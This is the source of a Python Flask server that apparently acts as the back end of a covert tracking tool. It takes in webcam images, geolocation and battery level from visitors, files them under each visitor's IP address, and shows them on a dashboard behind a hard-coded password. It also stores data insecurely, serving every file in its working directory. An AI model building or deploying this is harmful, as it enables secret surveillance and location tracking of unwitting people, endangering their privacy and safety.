from flask import Flask, render_template, request, jsonify, send_from_directory
import json
import base64
import os
import random
import string

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './'
app.config['PASSWORD'] = 'NOA'

def is_authenticated(password):
    return password == app.config['PASSWORD']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save-image', methods=['POST'])
def save_image():
    data = request.json
    image_data = data['image']
    camera_type = data['camera']

    # Generate a random ID for the image filename
    image_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=4))
    image_filename = f"{request.remote_addr}_img_{image_id}.png"

    # Save the image file
    image_data = image_data.replace('data:image/png;base64,', '')
    try:
        with open(image_filename, 'wb') as f:
            f.write(base64.b64decode(image_data))
    except Exception as e:
        print('Error saving image:', str(e))
        return jsonify(status='error')

    return jsonify(status='success')

@app.route('/save-user-info', methods=['POST'])
def save_user_info():
    data = request.json

    # Get the user information
    ip_address = request.remote_addr
    battery_level = data['batteryLevel']
    latitude = data['latitude']
    longitude = data['longitude']

    # Generate a random ID for the JSON filename
    json_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=4))
    json_filename = f"{request.remote_addr}_{json_id}.json"

    # Create a dictionary with the user information
    user_info = {
        'ip_address': ip_address,
        'battery_level': battery_level,
        'latitude': latitude,
        'longitude': longitude
    }

    # Save the user information as JSON
    try:
        with open(json_filename, 'w') as f:
            json.dump(user_info, f)
    except Exception as e:
        print('Error saving user info:', str(e))
        return jsonify(status='error')

    return jsonify(status='success')

@app.route('/data')
def data():
    # Check authentication
    password = request.args.get('password')
    if not is_authenticated(password):
        return 'Unauthorized', 401

    image_files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if f.endswith('.png')]
    return render_template('data.html', image_files=image_files)

@app.route('/images/<path:filename>')
def get_image(filename):
    return send_from_directory('./', filename)

if __name__ == '__main__':
    app.run()
